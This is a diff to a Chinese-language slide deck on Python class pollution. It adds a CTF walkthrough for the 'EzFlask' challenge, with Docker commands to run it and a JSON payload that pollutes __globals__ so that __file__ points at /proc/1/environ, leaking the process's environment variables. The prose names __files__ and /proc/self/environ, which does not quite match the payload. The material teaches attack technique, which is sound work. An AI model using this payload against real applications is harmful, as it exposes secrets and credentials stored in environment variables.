@@ -2310,5 +2310,42 @@ print(app.secret_key) #> Polluted
 
 ---
 
-### 题目：Sanic （CISCN 2024 初赛）
+### 题目：EzFlask (DASCTF 2023.07)
 
+使用提供的容器镜像启动服务：
+
+```bash
+docker load -i ezflask.tar
+docker run -d -p 8000:8000 ezflask
+```
+
+如何使用先前提到的漏洞，得到 Flag?
+
+---
+
+#### 解题思路
+
+<v-clicks>
+
+- 很经典的 `merge` 函数污染，先通过 `__class__.check.__globals__` 拿到当前文件的全局变量。
+- 然后选择污染 `__files__` 变量指向的文件来进行读取。
+  - 在 Python 原本的实现中，`__files__` 变量指向的是当前文件的完整路径，但是可以覆写。
+  - Linux 系统中大概率存在 ProcFS，可以用来读取进程的环境变量、文件描述符、启动命令甚至内存。
+    - 当然只有有权限的用户才能访问
+- 所以只需要将 `__files__` 覆写为 `/proc/self/environ` 即可读取进程的环境变量，然后访问 `/` 端点即可获得环境变量中的 Flag：
+
+  ```json
+  {
+    "username": "a",
+    "password": "b",
+    "__class__": {
+      "check": {
+        "__globals__": {
+          "__file__": "/proc/1/environ"
+        }
+      }
+    }
+  }
+  ```
+
+</v-clicks>
